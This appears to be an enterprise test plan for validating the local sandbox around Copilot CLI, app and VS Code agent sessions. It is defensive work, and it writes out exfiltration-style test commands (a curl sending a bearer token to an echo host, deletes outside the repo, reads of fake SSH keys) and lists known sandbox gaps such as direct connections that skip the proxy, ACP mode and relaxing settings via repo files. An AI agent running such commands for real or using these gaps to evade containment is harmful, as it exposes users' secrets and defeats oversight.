# Copilot Local Sandbox – Test & Validation Plan (CLI · App · VS Code)

Oct 22, 2026 · @SK

## 1. How to use this plan

This plan lists **138 test cases** across 8 areas plus 9 pre-flight checks. Each one says what to do and what to expect with the sandbox **ON** (per client) and **OFF**. Run it on a **canary device per ring** before Intune assigns the next group.

- **Clients in scope** — **Copilot CLI** ≥ 1.0.93, **GitHub Copilot app** ≥ 1.1.26, **VS Code** ≥ 1.141.0 (**Copilot harness / Agent Host** sessions only).
- **Two hosts per client** — run every case on **native Windows 11** and again inside **WSL2** (VS Code via Remote-WSL; CLI launched inside the distro). Outcomes differ, mainly on network.
- **"OFF" means** the sandbox is not active for that session — no managed `sandbox` key, user setting off, or session opt-out. The agent's commands then run with **your full Windows/Linux account rights**.
- **Approvals are a separate layer** — keep the permission level on **manual approvals** during testing so you see each command. VS Code sandboxing still applies under **Allow all**.
- **Use a throwaway test repo** with planted **fake** secrets (e.g. `C:\SbxTest\secrets\fake-token.txt`, `%USERPROFILE%\.ssh\id_fake`). Never test with real credentials.

**Test policy profiles** (apply one at a time; record which profile each run used)

| Profile | How delivered | Key values |
| --- | --- | --- |
| **P0 – OFF** | Nothing managed; user setting off | `enabled` off |
| **P1 – Default ON** | User setting only | `enabled: true`, all other defaults |
| **P2 – Observe** | Intune (registry) | `enabled: true`, `learningMode: "allow"` (Ring 0) or `"deny"` (Ring 1) |
| **P3 – Balanced** | Intune + WSL file | P2 + `failIfUnavailable: true`, `learningMode: "deny"`, `allowLocalNetwork: true`, `allowedHosts` list, `deniedPaths` |
| **P4 – Strict** | Intune | P3 + `allowBypass: false`, `allowDevToolAccess: false`, `auth.gh: false` |

**Evidence to capture for every case**

- Output of **`/sandbox status`** and **`/sandbox policy`** (CLI, VS Code); a screenshot of the app's **Sandbox** project settings plus the session banner.
- VS Code: **Developer: Policy Diagnostics** export.
- The exact command, its output or error text, and any bypass prompt wording (**"sandbox relaxed"** / **"sandbox bypassed"** on Windows CLI).
- Pass / fail against the expected outcome, and a ServiceNow ticket for any deviation.

> **Legend in tables:** ✅ allowed / works · ⛔ blocked · ⚠️ works with caveat · 🔍 verify — docs don't state this outcome clearly. "OFF" column applies to all three clients unless noted.

## 2. Pre-flight checks (before any ON/OFF test)

If any pre-flight fails, stop — every later result on that device is invalid.

| ID | Check | How to verify | Copilot CLI | Copilot app | VS Code |
| --- | --- | --- | --- | --- | --- |
| PF-01 | **Windows build** | `winver` / Intune compliance | 25H2 ≥ 26200.9550 (**KB5124010**) or 26H1 ≥ 28000.3086 (**KB5124006**), BaseContainer support | Same | Same (Windows support marked **Experimental**) |
| PF-02 | **WSL2 packages** | `bwrap --version`, `which slirp4netns`, `unshare --help \| grep map-current-user`, `iptables --version` | bwrap ≥ 0.5.0 + slirp4netns (+ util-linux ≥ 2.35, iptables for outbound) | n/a (app sessions are local Windows) | bwrap ≥ 0.5.0, slirp4netns, util-linux ≥ 2.35, iptables tools; glibc distro; WSL1 ⛔ |
| PF-03 | **Client version** | `copilot --version` · app About · VS Code Help → About | ≥ **1.0.93** | ≥ **1.1.26** | ≥ **1.141.0** |
| PF-04 | **Below-minimum client** (negative) | Install one version older on a test VM, deliver managed `sandbox` | ⛔ Copilot connections blocked until upgraded | ⛔ Same | ⛔ Chat shows required vs installed version; editor banner; Agents window blocking notice |
| PF-05 | **MDM values landed** | `reg query HKLM\SOFTWARE\Policies\GitHubCopilot` | Values present as `REG_SZ` | Same | Same; also **Developer: Policy Diagnostics** shows source |
| PF-06 | **WSL file policy** | `ls -l /etc/github-copilot/managed-settings.json` | root-owned, 0644, not a symlink — else file is rejected | n/a | Same file read by Agent Host in WSL 🔍 |
| PF-07 | **Server-managed fetched** | Enterprise → AI controls → Copilot settings validation; restart client | No validation errors; values visible in `/sandbox policy` | Effective policy not shown in app UI 🔍 — use CLI on same account to confirm | Policy Diagnostics shows **server-managed** source |
| PF-08 | **Legacy VS Code harness** | Check **Session Target** = Copilot | n/a | n/a | Agent Host session selected; Local harness ignores runtime sandbox rules |
| PF-09 | **Clean test repo** | Repo on local NTFS (not OneDrive), fake secrets planted | ✅ | ✅ | ✅ |

## 3. Enablement and policy enforcement

These prove the sandbox is actually on, comes from the right layer, and cannot be switched off where policy says so.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| EN-01 | **Enable via user setting** (P1) | CLI `/sandbox enable` · App Settings → Projects → Sandbox → **Sandbox new sessions** · VS Code `"chat.agent.sandbox.enabled": "on"` | ✅ Takes effect now; saved to `settings.json` | ✅ Applies to **new** local/working-tree sessions | ✅ Applies to new Copilot harness sessions | Commands run with full account rights |
| EN-02 | **Read effective policy** | CLI/VS Code `/sandbox policy`; app: project Sandbox section | ✅ Lists R/W, read-only, denied paths, network, dev-tool access, Notes for missing paths | ⚠️ UI shows **requested** policy only, not managed locks | ✅ Opens `sandbox-policy.md` with host, backend, FS and network policy | CLI says sandbox is off; VS Code report says restrictions not active |
| EN-03 | **Status check** | CLI `/sandbox status` · `/statusline` · VS Code Permissions menu | ✅ Shows on + whether managed requires it; status line shows sandbox indicator | ✅ No "Sandbox off" banner on the session | ✅ **Sandboxing for terminal** shows on | Status shows off |
| EN-04 | **Managed force-on** (P2) | Try to turn off: CLI `--no-sandbox` / user setting off · app `/sandbox off` · VS Code session toggle | ⛔ Cannot turn off; settings show `(managed)` | ⛔ Project toggle and `/sandbox off` cannot override | ⛔ Toggle **locked** if `allowBypass` is false **or omitted** | User can freely turn it off (no managed key) |
| EN-05 | **Surfaces are independent** | Enable in CLI only, then start app and VS Code sessions | ✅ CLI sandboxed | ⛔ App **not** sandboxed (own setting) | ⛔ VS Code **not** sandboxed (own setting) | n/a — expected: settings never sync |
| EN-06 | **Repo cannot set sandbox** | Commit a `sandbox` block into the repo's Copilot settings file | ✅ Ignored — repo-level files can't set sandbox | n/a | ⚠️ Likely **yes** — a third-party report (cfgaudit#751) says `chat.agent.sandbox.*` keys have no scope restriction, so a committed `.vscode/settings.json` can relax them in a trusted workspace. Unconfirmed by Microsoft: test each key; managed policy must still win | Repo file has no effect |
| EN-07 | **Running sessions vs new** | Change a setting while a session is open | Open sessions keep old policy; restart (`copilot --continue`) or run `/sandbox enable` there | Applies to new sessions or after **`/restart-session`** | New sessions inherit host config; explicit session choice persists on restore | — |
| EN-08 | **One-off flags** | `copilot --sandbox -p "run git status"` and `--no-sandbox` | ✅ `--sandbox` sandboxes that run; `--no-sandbox` ⛔ refused when managed | n/a | n/a | `--no-sandbox` runs unsandboxed |
| EN-09 | **Intune change picked up** | Change a `HKLM\SOFTWARE\Policies\GitHubCopilot` value | ✅ New value within the hourly re-check 🔍 (restart to be sure) | ✅ Same 🔍 | ✅ Run **Developer: Sync Account Policy**, then Policy Diagnostics | — |
| EN-10 | **Rollback** | Delete `sandbox.*` registry values / revert server commit | Sandbox no longer forced; user setting decides | Same | Same | Back to user choice |
| EN-11 | **Team override** (server) | Put test user in `copilot-sbx-exempt` team with a reduced `sandbox` object | ✅ Team object **replaces** the whole default — only what it restates applies | ✅ Same | ✅ Same (if VS Code enforcement confirmed) | — |
| EN-12 | **learningMode "allow"** (Ring 0, Windows) | Ask agent to write to `%USERPROFILE%\Desktop\x.txt` and `curl` a non-allowed host | ⚠️ File write **succeeds and is recorded**; network still ⛔ | ⚠️ Same (runtime enforces managed object) | 🔍 Expected same; confirm | Write succeeds, nothing recorded |
| EN-13 | **learningMode "deny"** (Ring 1+) | Same as EN-12 | ⛔ Write blocked **and recorded** | ⛔ Same | ⛔ Same 🔍 | Write succeeds |

> **Note:** learningMode has **no effect in WSL2** (Windows-only feature). Run EN-12/13 on native Windows.

## 4. Filesystem

The sandbox is **deny-by-default**: CWD (and `.git`) read/write, temp and build caches writable, tools on PATH and system locations read-only. With it OFF, every case here succeeds — that is the risk being tested.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| FS-01 | **Edit inside workspace** | Ask agent: `echo test > notes.txt` in repo | ✅ | ✅ | ✅ | ✅ |
| FS-02 | **Git metadata writes** | `git add . && git commit -m test` | ✅ `.git` is R/W. Older Windows builds: use `git -C "C:\path\repo" status` | ✅ | ✅ | ✅ |
| FS-03 | **Write above CWD in same repo** | Start session in `repo\src`, write `..\README.md` | ⛔ Rest of repo is **read-only** | 🔍 App grants workspace + CWD — confirm | 🔍 Only CWD auto-granted — confirm | ✅ |
| FS-04 | **Write outside repo** | `echo x > %USERPROFILE%\Desktop\x.txt` | ⛔ | ⛔ | ⛔ | ✅ |
| FS-05 | **Delete outside repo** | `rmdir /s /q C:\SbxTest\outside` (or `rm -rf` in WSL) | ⛔ Folder survives | ⛔ | ⛔ | ⚠️ **Folder deleted** — the core risk |
| FS-06 | **Read home secrets (no deniedPaths)** | `type %USERPROFILE%\.ssh\id_fake` | 🔍 Docs conflict: one page says home is **read-only**, another says home is **not** granted — record actual result | 🔍 | ⛔ Blocked — Microsoft's test plan (vscode#319218) expects a home-folder file outside the workspace to fail with "Access is denied" / "Permission denied" | ✅ Readable |
| FS-07 | **deniedPaths enforced** (P3) | Add `.ssh` and `C:\SbxTest\secrets` to `deniedPaths`; read them | ⛔ On Windows, if the build can't enforce deny → command **fails** with unsupported-policy (never runs open) | ⛔ Same fail-closed behaviour | ⛔ | ✅ Readable |
| FS-08 | **Denied child under granted parent** | Grant `C:\SbxTest` R/W, deny `C:\SbxTest\secrets` | ⛔ Child stays denied (more specific wins) | ⛔ | ⛔ (denied > read-only > R/W) | ✅ |
| FS-09 | **Read-only grant** | Add `C:\SbxTest\ref` to read-only; read then write | ✅ read · ⛔ write | ✅ / ⛔ ("Additional read-only") | ✅ / ⛔ | ✅ / ✅ |
| FS-10 | **Extra read/write grant** | Add `D:\build\out` to R/W; write a file | ✅ | ✅ ("Additional read/write") | ✅ | ✅ |
| FS-11 | **Denied path that doesn't exist yet** | Deny `repo\.env` before creating it; run any command | ⚠️ CLI **creates a directory** at `.env` and leaves it — create the real file first | 🔍 | 🔍 | No side-effect |
| FS-12 | **Working directory not auto-granted** | Set `addCurrentWorkingDirectory: false`; run `git status` | ⛔ Git fails until paths granted manually | n/a | n/a — VS Code always grants CWD | ✅ |
| FS-13 | **Package install – default dev-tool access** | `npm ci`, `pip install -r`, `dotnet restore`, `mvn package` against Artifactory | ✅ Registries/toolchains read-only, build caches R/W | ✅ | ✅ (also reads tool dirs on PATH) | ✅ |
| FS-14 | **Dev-tool access OFF** (P4) | `allowDevToolAccess: false`; repeat FS-13; `type %USERPROFILE%\.npmrc` | ⛔ Restore/auth likely fails until cache **R/W** and config paths granted; `.npmrc` ⛔ | 🔍 Managed-only for app | ⛔ Same | ✅ |
| FS-15 | **Preview a command's access** | `/sandbox policy npm install` | ✅ Shows dev-tool grants without running it | n/a | 🔍 `/sandbox policy` exists; command arg not documented | Reports sandbox off |
| FS-16 | **Built-in edit tool (not shell)** | Ask agent to *edit* `%USERPROFILE%\Desktop\x.txt` with its file tool | ⚠️ Blocked by **software** check only (no OS backstop) | 🔍 | ⚠️ Uses VS Code's own permission checks / approvals | Governed by approvals only |
| FS-17 | **`/add-dir` is not a sandbox grant** | `/add-dir C:\SbxTest\other`, then write there via shell | ⛔ Still blocked — grant via `/sandbox config` instead | n/a | n/a | ✅ |
| FS-18 | **Symlink out of workspace** | `mklink /D repo\link C:\SbxTest\secrets`, then `type link\fake-token.txt` | ⛔ Links inside a granted dir are **not** followed to new targets 🔍 | 🔍 | 🔍 | ✅ |
| FS-19 | **Temp directory writes** | `python -c "import tempfile; open(tempfile.mktemp(),'w').write('x')"` | ✅ | ✅ | ✅ | ✅ |
| FS-20 | **Managed path grant intersection** | Managed R/W `C:\src`; user R/W `C:\src\app` | ⛔ User grant **dropped** (exact-string match, not parent coverage) — check `/sandbox policy` | ⛔ | ⛔ | n/a |
| FS-21 | **WSL: reach Windows files** | From WSL session, write to `/mnt/c/Users/<u>/Desktop/x.txt` | ⛔ Unless granted on the **Linux** side | n/a | ⛔ (paths resolved on WSL host) | ✅ |

## 5. Network

Network is where **native Windows and WSL2 differ most**: on WSL2 the sandbox forces traffic through its proxy; on Windows it relies on programs honouring proxy variables. Run every case on both hosts.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| NW-01 | **Default outbound** | `curl -I https://example.org` | ✅ Outbound on by default | ✅ On by default | ✅ `allowNetwork` defaults true | ✅ |
| NW-02 | **Outbound OFF** | `allowOutbound: false` / app "Outbound internet" off / `network.allowNetwork: false`; repeat NW-01, `npm ci`, `git fetch` | ⛔ All fail; host rules + proxy become **inactive** | ⛔ | ⛔ Also blocks the **Integrated Browser** | ✅ |
| NW-03 | **Allowlist enforced** (P3) | `allowedHosts` = github.com, Artifactory; `curl` an allowed and a non-listed host | ✅ allowed · ⛔ other. **Windows ⚠️** for proxy-aware tools only; **WSL2** enforced | ✅ / ⛔ (managed) | ✅ / ⛔ (`allowedDomains`) | ✅ both |
| NW-04 | **Proxy-ignoring program** (Windows) | Run a tool that ignores `HTTPS_PROXY` (e.g. a small Node `net.connect` to a non-listed host:443) | ⚠️ **Can connect directly** on Windows — guardrail, not boundary. WSL2: ⛔ | ⚠️ Same | ⚠️ Same | ✅ |
| NW-05 | **Blocklist** | `blockedHosts: ["pastebin.com"]`; curl `pastebin.com` and `api.pastebin.com` | ⛔ Both — block covers subdomains, beats allow | ⛔ | ⛔ (`deniedDomains`) | ✅ |
| NW-06 | **Wildcard semantics** | Allow `*.example.com`; curl `api.example.com` and `example.com` | ✅ subdomain · ⛔ apex | ✅ / ⛔ | 🔍 Matching rules documented only for CLI | ✅ |
| NW-07 | **Managed ∩ user, no overlap** | Managed allows `github.com`; user allows only `pypi.org` | ⛔ **Every host denied**; dialog/policy shows closed list | ⛔ | ⛔ 🔍 | n/a |
| NW-08 | **Reach host's local dev server** | Start `python -m http.server 8000` on the host yourself; agent runs `curl localhost:8000` | ⛔ Local network **off by default** | ✅ Local network **on by default** · ⚠️ Known Windows bug: loopback to host processes **times out** (app#4278) — see GH-28 | ⛔ Off by default | ✅ |
| NW-09 | **Local network ON** | Enable local network; repeat NW-08 and curl a LAN IP (e.g. printer) | ✅ Windows: localhost (supported build) **and private network** reachable · WSL2: not host localhost directly; via built-in proxy only, subject to host rules | ✅ | ✅ | ✅ |
| NW-10 | **Host rules with local network OFF** (Windows) | `allowedHosts` set + `allowLocalNetwork: false` | ⛔ Sandboxed commands **don't start** | 🔍 | ⛔ Commands don't launch | n/a |
| NW-11 | **Agent-started server** | Agent runs `npm run dev`, then `curl localhost:3000` in the same sandbox | ✅ WSL2 (private net namespace) · 🔍 Windows with proxy active | 🔍 | 🔍 | ✅ |
| NW-12 | **Corporate upstream proxy** | `proxy.url` set (managed); curl through it, check proxy logs | ✅ Traffic via proxy; URL shows `(managed)`; Windows needs local network ON; Linux needs IPv4 proxy | 🔍 Managed only | 🔍 No user key; managed only | Uses system proxy settings |
| NW-13 | **Built-in fetch / browser** | Ask agent to fetch `http://localhost:8000` with its web tool; open Integrated Browser | `web_fetch` follows local-network setting | 🔍 | Integrated Browser follows sandbox `allowNetwork` + allowed/denied domains (denied wins). ⚠️ The **fetch-page tool is not covered** by sandbox network rules (vscode#339644) — restrict it with `ChatAgentNetworkFilter` device policies | ✅ |
| NW-14 | **IP and CIDR rules** | Allow `203.0.113.10`; separately try `203.0.113.0/24` | ✅ single IP · ⛔ CIDR **not supported** | 🔍 | 🔍 | n/a |
| NW-15 | **Remote MCP connection** | With local network off, connect a remote MCP on a private address | ⛔ Local-network setting applies when MCP sandboxing on | 🔍 | 🔍 | ✅ |

> **macOS note (not our fleet, but admin Macs):** a CLI report against 1.0.64 found the Seatbelt backend can't filter by hostname — `allowedHosts` degraded to allow-all and `blockedHosts` was rejected ([cli#3861](https://github.com/github/copilot-cli/issues/3861)). A docs fix was linked; re-test NW-03/NW-05 on any Mac before relying on host rules there.

## 6. Credentials

With the sandbox ON, tools get **placeholders** and a local proxy injects real values only into **HTTPS headers** to approved hosts. With it OFF, tools see your **real** tokens — the exfiltration tests below should *succeed* when OFF, which proves why ON matters. Use a **disposable test PAT** and a request-echo endpoint you own (e.g. an internal echo service), not a public one.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| CR-01 | **HTTPS git push** | Agent: `git push origin test-branch` | ✅ Real creds injected at original host/port/repo only | ✅ ("Git credentials" on) | ✅ (`authenticategit`) | ✅ |
| CR-02 | **gh CLI** | `gh api user`, `gh pr create` | ✅ Only to `github.com`, `api.github.com`, `uploads.github.com` | ✅ | ✅ (`authenticategh`) | ✅ |
| CR-03 | **Token visible to process?** | `gh auth token` / print `GH_TOKEN` | ⚠️ **Placeholder** only | ⚠️ Placeholder | ⚠️ Placeholder | ⚠️ **Real token** printed |
| CR-04 | **Token sent to another host** | `curl -H "Authorization: Bearer $GH_TOKEN" https://<your-echo-host>` | ✅ Echo receives **placeholder** | ✅ Placeholder | ✅ Placeholder | ⚠️ Echo receives **real token** |
| CR-05 | **Git creds disabled** | `auth.git: false` / app toggle off / `authenticategit: false`; repeat CR-01 | ⛔ Push fails | ⛔ | ⛔ | ✅ |
| CR-06 | **gh creds disabled** (P4) | `auth.gh: false`; repeat CR-02 | ⛔ gh unauthenticated | ⛔ | ⛔ | ✅ |
| CR-07 | **Masked custom variable** | `credentials.envVars.ARTIFACTORY_TOKEN.injectHosts=["<artifactory>"]`; `npm ci` + print the var | ✅ Install works; printed value is placeholder | 🔍 No documented setting | 🔍 No documented user setting | Real value visible |
| CR-08 | **Masked var in body / URL / HTTP** | Send it in a POST body, query string, or plain `http://` | ⛔ **Never** receives real value | n/a | n/a | Real value sent |
| CR-09 | **Inject host not network-allowed** | Inject host missing from `allowedHosts` | ⛔ Connection blocked — injection ≠ network allow | n/a | n/a | ✅ |
| CR-10 | **Masking with local network OFF** (Windows) | `allowLocalNetwork: false` + masking on (git/gh defaults count) | ⛔ Commands needing the proxy **don't launch** | 🔍 | ⛔ Same | n/a |
| CR-11 | **Credential files on disk** | `type %USERPROFILE%\.npmrc`, `%APPDATA%\NuGet\NuGet.Config` | ⚠️ **Readable** with dev-tool access ON — masking doesn't hide files | ⚠️ | ⚠️ | ✅ readable |
| CR-12 | **SSH git remote** | `git push` to `git@github.com:…` | 🔍 No SSH injection documented; expect failure — standardise on HTTPS remotes | 🔍 | 🔍 | ✅ |
| CR-13 | **Sandbox CA trust** | Masking on; run a tool that trusts only the OS store (e.g. some Java/.NET clients) | ⚠️ TLS error until CA trusted: `/sandbox ca create` + `/sandbox ca trust` (Windows: **admin, machine-wide**) | 🔍 | ⚠️ **Sandbox: Manage Trusted CA** → Install (admin on Windows). WSL uses per-process bundle | No proxy, no CA needed |
| CR-14 | **Pinning / HTTP2 / client certs** | Run a tool with cert pinning or mTLS through an injected host | ⚠️ May fail even with CA trusted | 🔍 | 🔍 | ✅ |
| CR-15 | **Bypass exposes secrets** | Approve a bypass for a command, then print `GH_TOKEN` | ⚠️ Bypassed command **skips masking and proxy** — real secret visible | ⚠️ 🔍 | ⚠️ 🔍 | Real secret visible |

## 7. MCP servers, language servers and hooks

Local (stdio) MCP and LSP servers run third-party code with your rights; the sandbox contains them by default. Remote MCP servers are **never** sandboxed — control them with `allowedMcpServers` / `deniedMcpServers`.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| MC-01 | **Local MCP contained** | Add a test filesystem MCP server rooted at `C:\`; ask it to read `C:\SbxTest\secrets\fake-token.txt` | ⛔ Read blocked | ⛔ | ⛔ (servers managed by Agent Host) | ✅ Read succeeds |
| MC-02 | **MCP sandboxing switched off** | `sandboxMcpServers: false` (user) vs managed `true` | User only: server runs **unsandboxed**, MC-01 ✅. Managed `true`: forced back in sandbox | 🔍 Managed only | `mcpServers: false` → unsandboxed; managed wins | ✅ |
| MC-03 | **MCP needing network** | Start an approved corp MCP (e.g. Jira via `npx`) | ✅ if host allowed · ⛔ otherwise | ✅ / ⛔ | ✅ / ⛔ | ✅ |
| MC-04 | **Remote MCP server** | Connect `https://mcp.<corp-domain>/…` and a non-approved URL | ✅ approved · ⛔ only if blocked by `deniedMcpServers` / allowlist — FS policy does **not** apply | Same | Same | Same (sandbox irrelevant) |
| MC-05 | **Masked vars in local MCP** | Masked var configured; MCP server prints its env | ✅ Sees placeholder | n/a | n/a | Real value |
| MC-06 | **Language server works** | Open TS/C#/Python project; go-to-definition, diagnostics | ✅ LSP runs sandboxed | ✅ 🔍 | ✅ (`lspServers`) | ✅ |
| MC-07 | **LSP write outside workspace** | Project with a build hook that writes to `%USERPROFILE%\Desktop` on load | ⛔ | ⛔ 🔍 | ⛔ | ✅ |
| MC-08 | **Servers you start yourself** (VS Code) | Start an MCP/LSP manually outside the session | n/a | n/a | ⚠️ **Not covered** — only Agent Host–managed servers | n/a |
| MC-09 | **User / repo hooks** | Repo hook script writes to `%USERPROFILE%\Desktop\hook.txt` | ⛔ Runs **inside** sandbox; warning shown once per hook per session | 🔍 | 🔍 Hook behaviour depends on harness | ✅ |
| MC-10 | **Policy hooks** | Admin policy hook writes an audit file outside workspace | ✅ Runs **on host, outside** sandbox — must not run workspace scripts | 🔍 | ✅ Same (Copilot harness policy hooks) | ✅ |

## 8. Bypass, escape and session overrides

Bypass is the "off switch" one prompt away. Prove it behaves per profile: **available but visible** in observe rings, **gone** in Strict.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| BY-01 | **Blocked command prompts for bypass** (bypass allowed) | Trigger FS-04 | ✅ Prompt: approve this attempt · keep blocked · disable for session (if policy permits) | ✅ **Run outside the sandbox?** — cancel · run once · More options → **Disable sandbox and run** | ✅ **Allow Outside Sandbox** — one operation or whole session | No prompt; runs directly |
| BY-02 | **Approve once only** | Approve BY-01, then repeat a different blocked write | ✅ Second command blocked again | ✅ | ✅ | — |
| BY-03 | **Reject the prompt** | Choose keep blocked / cancel | ⛔ Command does not run | ⛔ | ⛔ | — |
| BY-04 | **Staged retry on Windows** | Approve a bypass for a FS-blocked command | ⚠️ First **"sandbox relaxed"** (FS/process loosened, network kept), then **"sandbox bypassed"** if still blocked | 🔍 | 🔍 | — |
| BY-05 | **Disable for rest of session** | CLI `/sandbox disable` (managed on, bypass allowed) · app "Disable sandbox and run" · VS Code approve session bypass | ⚠️ Off for **this session only**; saved policy unchanged | ⚠️ Banner **Sandbox off for this session**; **Re-enable sandbox** available | ⚠️ Later commands run unrestricted until turned back on | — |
| BY-06 | **Session opt-out doesn't persist** | After BY-05, restart session / reattach | ✅ Sandbox back on | ✅ Ends on restart or reattach | ✅ New session inherits host config | — |
| BY-07 | **Bypass prohibited** (P4: `allowBypass: false`) | Trigger FS-04; try `/sandbox disable` | ⛔ No prompt — command stays blocked; `/sandbox disable` refused | ⛔ No outside-sandbox option 🔍 (managed only) | ⛔ No **Allow Outside Sandbox**; request fails | — |
| BY-08 | **VS Code: managed ON, `allowBypass` omitted** | P2 profile without `allowBypass` | ✅ Bypass still offered (CLI default true) | ✅ 🔍 | ⛔ Toggle **locked on** — omitted = locked | — |
| BY-09 | **Allow-all / YOLO with sandbox** | Select **Allow all** (VS Code) or `--yolo` (CLI) | ⛔ `--yolo` suppressed if `disableBypassPermissionsMode: "disable"`; else auto-approves but sandbox still restricts | ⛔ "Allow all" blocked under same managed key | ✅ Sandbox still restricts under Allow all | Commands run with full rights, no prompts |
| BY-10 | **Bypass is not elevation** | Approve bypass for `reg add HKLM\…` | ⛔ Still fails — runs as your user, no admin | ⛔ | ⛔ | ⛔ Same (no admin) |

## 9. Negative and failure-mode tests

The key property to prove: when the sandbox **can't** run, Copilot fails **closed**, never silently open — except the known gaps flagged ⚠️ below.

| ID | Use case | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| NG-01 | **Unsupported Windows build, user setting only** | Test VM without KB5124010/KB5124006 | ⚠️ Saved preference turned off for the session **with a notice**; `/sandbox enable` refused | ⛔ Session starts, sandboxed processes fail; **Sandbox unavailable** → **Retry sandbox** | ⛔ Command doesn't run; notification to install missing update | Works (unsandboxed) |
| NG-02 | **Unsupported build + MDM/file `enabled: true`** | Same VM, Intune values applied | ⛔ Sandboxed commands **fail** (never run open) | ⛔ Same | ⛔ Same 🔍 | — |
| NG-03 | **Unsupported build + server-managed only** | Remove MDM; server `enabled: true` | ⚠️ Can be **declined** — runs unsandboxed unless `failIfUnavailable: true` | 🔍 | 🔍 | — |
| NG-04 | **`failIfUnavailable: true`** | Add to NG-03 | ⛔ Model **and** tool execution blocked for the session | ⛔ 🔍 | ⛔ 🔍 | — |
| NG-05 | **WSL2 missing dependency** | Remove `slirp4netns` or `bwrap` | ⛔ Error names missing dependency; restart after fix | n/a | ⛔ "Sandboxing might not work as expected"; doesn't run unsandboxed | Works |
| NG-06 | **Unsupported Linux** | Alpine/musl devcontainer, or WSL1 | 🔍 Expect failure | n/a | ⛔ Not supported | Works |
| NG-07 | **ACP mode** | `copilot --acp` with `enabled: true`, `allowBypass: false`; write to a read-only path | ⚠️ **Known issue #5089: write succeeds — sandbox not applied.** Fail until fixed | n/a | n/a | Write succeeds |
| NG-08 | **VS Code Local harness** | Start a **Local** session on Windows; repeat FS-04 | n/a | n/a | ⚠️ **Changed in 1.142:** with managed `sandbox.enabled: true` or a non-empty `permissions` object, Local is unavailable for new chats and **opening an existing Local chat auto-moves it to the Copilot harness** (original archived; nothing sent). Only if admins set `vscode.temporaryDefaultToLocalHarness: true` does Local remain — and then it is **unsandboxed** on Windows | Same |
| NG-09 | **Claude / Codex harness in VS Code** | Any managed settings present; open harness picker | n/a | n/a | ⛔ Claude and Codex harnesses **disabled** (even with `enabled: false`) | Available |
| NG-10 | **Offline start with forced refresh** | `forceRemoteSettingsRefresh: true`; start client offline | ⛔ Policy unconfirmed → affected operations restricted | ⛔ Same | ⛔ Copilot features blocked until refresh succeeds | Works offline (if not set) |
| NG-11 | **Bad WSL managed file** | Make `/etc/github-copilot/managed-settings.json` group-writable or a symlink | ⛔ File **rejected** — verify policy falls back to other layers, and alert | n/a | 🔍 | — |
| NG-12 | **Broken user settings.json** | Add `#comment` to the CLI file | 🔍 File fails to parse — values don't load; check startup warning | n/a | VS Code flags JSON errors in editor | — |
| NG-13 | **App cloud / remote-host session** | Start a cloud or remote-host session in the app | n/a | ⚠️ Local sandbox **does not apply** — out of scope | n/a | — |
| NG-14 | **Older Windows PowerShell CWD** | Pre-Sept-2026 build: `Set-Location`, relative git in sandbox | ⚠️ PowerShell reports `C:\` as CWD; fix = update OS | 🔍 | 🔍 | Works |

## 10. Sign-off checklist per ring

Run the mandatory set on **10 sampled devices per ring** (mix of native Windows and WSL2), on all three clients. A ring is promoted only when every mandatory case matches its expected outcome or has an accepted, ticketed exception.

| Ring / profile | Mandatory cases | Pass criteria |
| --- | --- | --- |
| **Ring 0 – Observe (P2, learningMode allow)** | PF-01…09, EN-01…05, EN-12, FS-01, FS-02, FS-13, NW-01, CR-01, CR-02, MC-01, MC-06, NG-07, NG-08 | Sandbox shows enabled + `(managed)`; build/test workflows clean; out-of-workspace writes **recorded** not blocked |
| **Ring 1 – Observe (P2, learningMode deny)** | Ring 0 set + EN-13, FS-03…10, FS-21, CR-03, CR-04, BY-01…06 | Out-of-workspace writes **blocked + recorded**; git/gh/package installs still work; bypass prompts behave per client |
| **Ring 2 – Balanced (P3)** | Ring 1 set + EN-09…11, FS-20, NW-02…12, CR-07…13, MC-02…05, NG-01…05, NG-10, NG-11 | Allowlist enforced on WSL2; Windows proxy-ignoring gap documented; deniedPaths fail closed; no build-pipeline regressions |
| **Strict (P4)** | Ring 2 set + FS-14, CR-05, CR-06, CR-15, BY-07…10 | No bypass anywhere; dev-tool and gh access off; required paths granted explicitly |
| **Every ring, OFF control** | FS-04, FS-05, CR-03, CR-04, MC-01 with **P0** | Each succeeds unsandboxed — confirms the tests themselves detect risk |

**Add from section 11 (GitHub issues and VS Code test plans):**

- **Ring 0:** GH-18 (corp-hardened image), GH-19 (D:/Dev Drive repos), GH-20 (shell CWD), GH-22 (override env var), GH-24 (OFF really off), GH-32 (Windows managed file)
- **Ring 1:** GH-01, GH-03, GH-04, GH-06…GH-13, GH-33, GH-34
- **Ring 2:** GH-14…GH-17, GH-21, GH-23, GH-25…GH-31
- **Strict:** GH-02, GH-05
- **Accept or track as known gaps:** GH-18, GH-19, GH-25, GH-28, GH-31 — each has an open upstream bug; re-test on every client version bump

* **Second sweep:** Ring 0 add GH-36, GH-37, GH-38 · Ring 1 add GH-35, GH-39 · Ring 2 add GH-40 (WSL) · Known gaps: GH-35 (until the app fix ships) and GH-36

**Sign-off record**

- [ ] Pre-flight green on all sampled devices
- [ ] Mandatory cases executed on **CLI, Copilot app and VS Code**, on Windows **and** WSL2
- [ ] All 🔍 cases resolved and the actual outcome written back into this doc
- [ ] Known gaps accepted by InfoSec: **NG-07 (ACP)**, **NG-08 (Local harness)**, **NW-04 (Windows egress)**, **CR-11 (credential files)**
- [ ] Evidence (policy output, Policy Diagnostics, screenshots) attached to the ring change record

